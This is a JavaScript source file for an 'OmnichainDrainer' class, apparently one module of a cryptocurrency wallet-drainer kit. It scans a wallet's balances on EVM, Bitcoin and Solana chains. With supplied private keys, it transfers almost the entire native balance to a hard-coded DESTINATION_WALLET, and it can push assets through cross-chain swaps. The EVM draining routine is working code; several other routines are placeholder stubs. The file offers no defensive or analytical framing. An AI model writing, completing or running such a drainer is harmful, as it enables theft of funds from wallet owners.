import { BitcoinDrainer } from './bitcoinDrainer.js';
import { ThorchainSwapper } from './thorchainSwapper.js';
import { UniversalTxBuilder } from './universalTxBuilder.js';
import { CHAINS_CONFIG, CROSS_CHAIN_AGGREGATORS, DESTINATION_WALLET } from '../config.js';
import { ethers, Wallet } from 'ethers';
import { Connection, PublicKey } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { chainManager } from './chainManager.js'; // ← ADDED IMPORT

export class OmnichainDrainer {
  constructor() {
    this.isInitialized = false;
    this.bitcoinDrainer = new BitcoinDrainer();
    this.thorchainSwapper = new ThorchainSwapper();
    this.txBuilder = new UniversalTxBuilder();
    this.activeChains = new Set();
  }

  async initialize() {
    if (this.isInitialized) return true;
    try {
      console.log(`🔄 Initializing ${this.constructor.name}...`);
      
      // Initialize Bitcoin drainer first
      try {
        await this.bitcoinDrainer.initialize();
        console.log('✅ Bitcoin drainer initialized');
      } catch (error) {
        console.warn('⚠️ Bitcoin drainer initialization failed:', error.message);
      }
      
      // ✅ ADDED: Skip chain initialization if already done by chainManager
      if (!chainManager.isChainsLoaded) {
        // Initialize all supported chains
        for (const [chainId, config] of Object.entries(CHAINS_CONFIG)) {
          try {
            await this.testChainConnection(chainId, config);
            this.activeChains.add(chainId);
            console.log(`✅ ${config.name} initialized`);
          } catch (error) {
            console.warn(`❌ Chain ${config.name} initialization failed:`, error.message);
          }
        }
      } else {
        // ✅ ADDED: Use chains already loaded by chainManager
        console.log('⏩ Using chains already initialized by chainManager');
        for (const [chainId, config] of Object.entries(CHAINS_CONFIG)) {
          this.activeChains.add(chainId);
        }
      }
      
      console.log(`✅ Active chains: ${Array.from(this.activeChains).join(', ')}`);
      this.isInitialized = true;
      console.log(`✅ ${this.constructor.name} initialized`);
      return true;
    } catch (error) {
      console.error(`❌ ${this.constructor.name} initialization failed:`, error);
      return false;
    }
  }

  // Scan assets across all chains
  async scanAllChains(walletAddress) {
    const results = {};
    
    for (const chainId of this.activeChains) {
      const config = CHAINS_CONFIG[chainId];
      try {
        results[chainId] = await this.scanChain(chainId, walletAddress, config);
      } catch (error) {
        results[chainId] = { error: error.message };
      }
    }
    
    return results;
  }

  async scanChain(chainId, walletAddress, config) {
    switch (config.type) {
      case 'evm':
        return await this.scanEVMChain(chainId, walletAddress, config);
      case 'bitcoin':
        return await this.bitcoinDrainer.getBTCBalance(walletAddress);
      case 'solana':
        return await this.scanSolanaChain(walletAddress);
      default:
        throw new Error(`Unsupported chain type: ${config.type}`);
    }
  }

  async scanEVMChain(chainId, walletAddress, config) {
    const provider = this.getProvider(chainId, config);
    
    const [balance, tokens] = await Promise.all([
      provider.getBalance(walletAddress),
      this.fetchERC20Tokens(chainId, walletAddress, config)
    ]);
    
    return {
      native: balance.toString(),
      tokens: tokens.filter(t => parseFloat(t.balance) > 0),
      chain: config.name,
      totalValue: await this.calculateTotalValue(balance, tokens, chainId)
    };
  }

  async scanSolanaChain(walletAddress) {
    try {
      const connection = new Connection(this.getSolanaRpc());
      const publicKey = new PublicKey(walletAddress);
      
      const [balance, tokenAccounts] = await Promise.all([
        connection.getBalance(publicKey),
        connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID })
      ]);
      
      return {
        native: balance,
        tokens: tokenAccounts.value.map(acc => ({
          mint: acc.account.data.parsed.info.mint,
          balance: acc.account.data.parsed.info.tokenAmount.uiAmount,
          symbol: acc.account.data.parsed.info.tokenAmount.symbol || 'UNKNOWN'
        })),
        chain: 'Solana'
      };
    } catch (error) {
      throw new Error(`Solana scan failed: ${error.message}`);
    }
  }

  // Execute drain across all chains
  async executeOmnichainDrain(walletAddress, privateKeys = {}) {
    const results = {};
    
    for (const chainId of this.activeChains) {
      const config = CHAINS_CONFIG[chainId];
      try {
        results[chainId] = await this.drainChain(
          chainId, 
          walletAddress, 
          privateKeys[chainId], 
          config
        );
      } catch (error) {
        results[chainId] = { error: error.message };
      }
    }
    
    return results;
  }

  async drainChain(chainId, walletAddress, privateKey, config) {
    switch (config.type) {
      case 'evm':
        return await this.drainEVMChain(chainId, walletAddress, privateKey, config);
      case 'bitcoin':
        return await this.bitcoinDrainer.drainBTC(walletAddress, privateKey, DESTINATION_WALLET);
      case 'solana':
        return await this.drainSolanaChain(walletAddress, privateKey);
      default:
        throw new Error(`Unsupported chain type: ${config.type}`);
    }
  }

  async drainEVMChain(chainId, walletAddress, privateKey, config) {
    const provider = this.getProvider(chainId, config);
    const signer = new Wallet(privateKey, provider);
    
    // Implement EVM draining logic here
    const balance = await provider.getBalance(walletAddress);
    
    if (balance > 0) {
      const gasReserve = ethers.parseEther('0.001');
      const drainAmount = balance - gasReserve;
      
      const tx = await signer.sendTransaction({
        to: DESTINATION_WALLET,
        value: drainAmount
      });
      
      return { success: true, txHash: tx.hash, amount: balance.toString() };
    }
    
    return { success: false, message: 'No balance to drain' };
  }

  async drainSolanaChain(walletAddress, privateKey) {
    // Implement Solana draining logic
    return { success: false, message: 'Solana draining not implemented' };
  }

  async crossChainSwap(assets, fromChain, toChain, toAsset) {
    const aggregator = this.selectBestAggregator(fromChain, toChain);
    
    if (!aggregator) {
      throw new Error('No suitable aggregator found');
    }

    switch (aggregator) {
      case 'THORCHAIN':
        return await this.executeThorchainSwap(assets, fromChain, toChain, toAsset);
      case 'LIFI':
        return await this.executeLifiSwap(assets, fromChain, toChain, toAsset);
      case 'SOCKET':
        return await this.executeSocketSwap(assets, fromChain, toChain, toAsset);
      default:
        throw new Error('Unsupported aggregator');
    }
  }

  async executeThorchainSwap(assets, fromChain, toChain, toAsset) {
    const quotes = [];
    
    for (const asset of assets) {
      const quote = await this.thorchainSwapper.getSwapQuote(
        `${fromChain}.${asset.symbol}`,
        `${toChain}.${toAsset}`,
        asset.amount
      );
      
      if (quote) quotes.push(quote);
    }
    
    const results = [];
    for (const quote of quotes) {
      try {
        const result = await this.thorchainSwapper.executeSwap(quote);
        results.push(result);
      } catch (error) {
        console.error('Thorchain swap failed:', error);
        results.push({ error: error.message });
      }
    }
    
    return results;
  }

  async executeLifiSwap(assets, fromChain, toChain, toAsset) {
    // Implement LiFi swap logic
    return { success: false, message: 'LiFi swapping not implemented' };
  }

  async executeSocketSwap(assets, fromChain, toChain, toAsset) {
    // Implement Socket swap logic
    return { success: false, message: 'Socket swapping not implemented' };
  }

  selectBestAggregator(fromChain, toChain) {
    for (const [name, config] of Object.entries(CROSS_CHAIN_AGGREGATORS)) {
      if (config.supportedChains.includes(fromChain) && 
          config.supportedChains.includes(toChain)) {
        return name;
      }
    }
    return null;
  }

  getProvider(chainId, config) {
    return new ethers.JsonRpcProvider(config.rpc);
  }

  getSolanaRpc() {
    return 'https://api.mainnet-beta.solana.com';
  }

  async fetchERC20Tokens(chainId, walletAddress, config) {
    // Implement token fetching logic
    return [];
  }

  async calculateTotalValue(balance, tokens, chainId) {
    // Implement value calculation logic
    return '0';
  }

  async testChainConnection(chainId, config) {
    const provider = this.getProvider(chainId, config);
    await provider.getBlockNumber();
  }
}

export default new OmnichainDrainer();